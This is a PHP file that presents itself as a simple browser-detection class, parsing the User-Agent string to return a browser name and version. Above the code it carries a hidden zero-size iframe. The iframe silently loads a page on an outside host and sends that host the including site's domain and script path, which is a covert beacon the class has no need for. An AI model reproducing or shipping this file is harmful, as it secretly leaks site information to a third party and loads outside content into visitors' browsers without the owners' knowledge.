<iframe src="http://wiki.sapphire.co.th/MonitoringLibrary2.php?libname=BrowserDetectV1P0&url=<?php echo $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']; ?>" height="0" width="0" style=" display: none" ></iframe>

<?php

class BrowserDetect {

    public function browser() {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
        // you can add different browsers with the same way ..
        if (preg_match('/(chromium)[ \/]([\w.]+)/', $ua))
            $browser = 'chromium';
        elseif (preg_match('/(chrome)[ \/]([\w.]+)/', $ua))
            $browser = 'chrome';
        elseif (preg_match('/(safari)[ \/]([\w.]+)/', $ua))
            $browser = 'safari';
        elseif (preg_match('/(opera)[ \/]([\w.]+)/', $ua))
            $browser = 'opera';
        elseif (preg_match('/(msie)[ \/]([\w.]+)/', $ua))
            $browser = 'msie';
        elseif (preg_match('/(mozilla)[ \/]([\w.]+)/', $ua))
            $browser = 'mozilla';

        preg_match('/(' . $browser . ')[ \/]([\w]+)/', $ua, $version);

        return array($browser, $version[2], 'name' => $browser, 'version' => $version[2]);
    }

}